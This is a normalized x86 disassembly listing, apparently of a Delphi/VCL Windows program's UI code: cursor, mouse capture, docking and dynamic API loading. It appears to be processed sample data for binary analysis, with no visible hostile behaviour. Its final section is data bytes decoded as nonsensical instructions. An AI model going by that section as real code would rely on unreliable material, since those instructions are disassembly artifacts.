mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45480c
pop ecx
mov eax ebx
call sub_452b88
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_452b88
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45480c
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_452b88
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42b204
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_45489c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_452b88
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_45270c
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_452b88
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_45480c
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4548ec
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_449958
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_449958
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_454968
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_452618
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_4526c4
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_452c6c
test eax eax
je r-xdata
mov eax esi
call sub_452690
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_454710
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_452f3c
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_452c6c
mov edx [ ebx + 0x20 ]
call sub_452bc4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_454968
pop ecx
sub_4549e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_452674
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_452674
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_452c6c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_4549e8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_454710
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_452f3c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_452870
mov eax edi
call sub_452c60
test eax eax
je r-xdata
mov eax edi
call sub_452c6c
mov esi eax
mov eax esi
call sub_452b88
push eax
mov eax esi
call sub_4526c4
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_452c60
call sub_452b88
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_452b88
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_452bb0
mov eax esi
call sub_452b88
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_452bb0
mov eax edi
call sub_452c6c
call sub_452c00
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_4526c4
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_452bb0
mov eax edi
call sub_452c60
call sub_452c00
mov bl 0x1
jmp r-xdata
sub_454b20
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_452ed4
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_419174
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4536c8
test eax eax
je r-xdata
push ebp
call sub_454968
pop ecx
push ebp
call sub_4549e8
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_4548ec
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_454ba8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_452754
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_452754
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45489c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45489c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_454c38
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_455010
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406e68
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4536c8
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45466c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e68
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4536c8
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_449afc
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455017
lea eax [ ebp - 0x48 ]
call sub_403fa4
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4507d8
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_448818
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_44acb8
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fa4
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_454b20
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44f2d0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_454720
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406e68
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_454ba8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_454720
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e68
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4536c8
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_449ed8
jmp r-xdata
mov eax edi
call sub_4674cc
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4536c8
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_449958
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_449fb8
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403ff8
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45460c
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_468bcc
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4507d8
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44a660
jmp r-xdata
sub_455020
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403578
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_455194
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_4550b0
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45516c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403244
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_455114
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_455144
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406f5c
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_45516c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4550e0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_455194
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_4550f8
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_455114
pop ebx
retn
mov eax ebx
call sub_455144
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_4551f8
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45535e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_45547c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_455460
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_455460
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_45556c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403254
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403254
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403254
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403254
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fa4
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403fa4
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4555f4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45576c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_4092bc
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403ff8
mov eax [ rw-data ]
call sub_404464
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_4092bc
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ff8
mov eax [ rw-data ]
call sub_404464
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404464
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a820
mov [ rw-data ] eax
call sub_4551f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_455020
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4684a8
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46958c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_46b21c
mov ecx r-xdata
mov edx sub_447074
mov eax [ r-xdata ]
call sub_419f98
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455773
lea eax [ ebp - 0x10 ]
call sub_403fa4
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4557dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45583b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455842
retn
mov eax rw-data
call sub_40d788
call sub_45556c
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a58
mov eax rw-data
call sub_403fa4
mov eax rw-data
call sub_403fa4
sub_455844
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4558ca
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4558d1
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_4555f4
mov eax [ r-xdata ]
call sub_419e0c
mov eax [ r-xdata ]
call sub_419eac
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419e58
sub_455b18
stc
push ebx
push eax
inc esp
bound eax [ ebp ]
or al 0x63
inc ebp
add [ eax ] dl
inc ebp
add [ eax ] dh
inc ebp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
je r-xdata
je r-xdata
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x6fdc0006
inc ebp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
inc ebp
add [ esp + ebp * 4 + 0x33c0041 ] ch
inc edx
mov al 0x34
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc ebx
push 0x65676e61
clc
pop ecx
inc ebp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
pop edx
inc ebp
add [ eax ] bl
add bh bh
push eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
in al 0x7c
inc ecx
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
inc eax
pop ebx
inc ebp
add [ eax ] cl
add [ eax ] cl
add al cl
stosd [ edi ]
inc ecx
add [ esp + eax ] dl
inc edx
add [ eax + 0x24004563 ] bl
add al 0x42
add [ eax + 0x74c0042 ] bl
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cwde
pop [ ecx ]
add al [ eax ]
or [ ecx + 0x63 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
pop ebp
inc ebp
add [ eax ] dh
add [ eax ] al
add [ esi + eax * 4 + 0x349c0041 ] al
inc eax
add [ eax - 0x53ffbfcc ] ch
xor al 0x40
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] dl
mov esp 0xacac0041
inc ecx
arpl [ ebp + 0x74 ] si
in al 0x7c
inc ecx
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax ] cl
bound eax [ ebp ]
sbb al 0x64
inc ebp
add [ eax + 0x63 ] bl
inc ebp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
dec esp
pop es
dec esp
imul esi [ ebx + 0x74 ] 0x5bb80000
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
pop ebx
inc ebp
add [ eax ] ch
add [ eax ] al
nop
pop edx
inc ebp
add [ edi + eax ] dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
add ah ah
mov al 0x41
add ah bl
scasd [ edi ]
inc ecx
add [ eax - 0x13ffbe42 ] bh
mov esi 0xbef00041
add [ esp + esi + 0x34b00040 ] ch
inc eax
je r-xdata
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
adc [ ecx + eax * 2 + 0x41acac00 ] bh
xor al 0x40
inc ebx
push 0x65676e61
clc
pop ecx
inc ebp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080007 ] al
outsb
push ebp
jo r-xdata
